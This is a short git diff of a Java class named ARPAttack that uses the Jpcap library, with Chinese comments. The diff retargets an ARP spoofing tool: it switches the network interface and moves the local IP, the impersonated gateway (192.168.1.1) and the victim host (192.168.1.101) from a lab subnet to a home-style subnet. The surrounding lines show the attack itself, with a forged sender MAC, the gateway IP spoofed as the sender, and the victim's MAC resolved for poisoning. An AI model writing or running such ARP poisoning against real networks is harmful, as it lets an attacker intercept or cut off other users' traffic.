@@ -40,7 +40,7 @@ public class ARPAttack {
   /**
    * 本地主机的0号网络设备，根据具体实际情况对参数0进行修改
    */
-  public static NetworkInterface device = JpcapCaptor.getDeviceList()[3];//网卡选项 无线0 有线3
+  public static NetworkInterface device = JpcapCaptor.getDeviceList()[0];//网卡选项 无线0 有线3
 
   /**
    * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
@@ -53,7 +53,7 @@ public class ARPAttack {
     JpcapCaptor jc = JpcapCaptor.openDevice(device, 2000, false, 3000); //打开网络设备，用来侦听
     JpcapSender sender = jc.getJpcapSenderInstance(); //发送器JpcapSender，用来发送报文
     //InetAddress senderIP = InetAddress.getByName("10.96.33.232"); //设置本地主机的IP地址，方便接收对方返回的报文
-    InetAddress senderIP = InetAddress.getByName("192.168.190.128"); //设置本地主机的IP地址，方便接收对方返回的报文
+    InetAddress senderIP = InetAddress.getByName("192.168.1.108"); //设置本地主机的IP地址，方便接收对方返回的报文
     InetAddress targetIP = InetAddress.getByName(ip); //目标主机的IP地址
 
     ARPPacket arp = new ARPPacket(); //开始构造一个ARP包
@@ -132,7 +132,7 @@ public class ARPAttack {
 
     byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
     arp.sender_hardaddr = srcmac;
-    arp.sender_protoaddr = InetAddress.getByName("192.168.190.1").getAddress();
+    arp.sender_protoaddr = InetAddress.getByName("192.168.1.1").getAddress();
 
     arp.target_hardaddr = getOtherMAC(ip);
     arp.target_protoaddr = InetAddress.getByName(ip).getAddress();
@@ -161,6 +161,6 @@ public class ARPAttack {
    */
   public static void main(String[] args) throws InterruptedException, IOException {
     //ARPAttack("10.96.81.56", 2000);
-    ARPAttack("192.168.190.102", 2000);
+    ARPAttack("192.168.1.101", 2000);
   }
 }
